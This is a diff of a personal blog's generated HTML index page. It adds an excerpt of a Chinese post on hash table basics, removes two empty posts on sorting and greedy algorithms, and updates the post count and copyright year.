+<p><a href="https://blog.csdn.net/Marksinoberg/article/details/52734332" target="_blank" rel="external">..</a></p>
+<h3 id="1-2-选择排序，插入排序，冒泡排序"><a href="#1-2-选择排序，插入排序，冒泡排序" class="headerlink" title="1.2 选择排序，插入排序，冒泡排序"></a>1.2 选择排序，插入排序，冒泡排序</h3><h3 id="1-3-快速排序"><a href="#1-3-快速排序" class="headerlink" title="1.3 快速排序"></a>1.3 快速排序</h3><h3 id="1-4"><a href="#1-4" class="headerlink" title="1.4"></a>1.4</h3>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/20/Hash-Table-基础/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lintao Fang">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Rat-racer's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/04/20/Hash-Table-基础/" itemprop="url">Hash Table 基础</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-20T02:00:59+08:00">
+                2018-04-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/data-structures/" itemprop="url" rel="index">
+                    <span itemprop="name">data structures</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/04/20/Hash-Table-基础/" class="leancloud_visitors" data-flag-title="Hash Table 基础">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><pre><code>1.1 什么是哈希Hash 
+1.2 哈希函数 Hash Function 
+    1.2.1 哈希函数性质
+    1.2.2 哈希函数的选择
+    1.2.3 Perfect Hash Function (PHF) 
+    1.2.4 Minimal Perfect Hash Function (MPHF)  
+          [Note]
+
+1.3 什么是哈希表 Hash Table
+    1.3.1 Key statistics 
+    1.3.2 Dynamic Resizing
+    1.3.3 ReHashing
+1.4 冲突 Collsion
+1.4 性能 
+1.5 哈希表的实现 Implementation 
+    1.5.1 PHF以及MPHF的实现
+    1.5.2 Java Python 实现
+1.6 应用 Applications 
+1.7 總結 Summary 
+1.7 References &amp; External Links
+</code></pre>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/04/20/Hash-Table-基础/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1490,266 +2027,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/08/第6，7，8，9章-排序/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Lintao Fang">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Rat-racer's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/11/08/第6，7，8，9章-排序/" itemprop="url">第6，7，8，9章-排序</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-11-08T19:03:31+08:00">
-                2017-11-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2017/11/08/第6，7，8，9章-排序/" class="leancloud_visitors" data-flag-title="第6，7，8，9章-排序">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">Visitors&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/08/第16章-贪心算法/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Lintao Fang">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Rat-racer's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/11/08/第16章-贪心算法/" itemprop="url">第16章-贪心算法</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-11-08T19:02:07+08:00">
-                2017-11-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2017/11/08/第16章-贪心算法/" class="leancloud_visitors" data-flag-title="第16章-贪心算法">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">Visitors&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1804,7 +2081,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-count">46</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1865,7 +2142,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
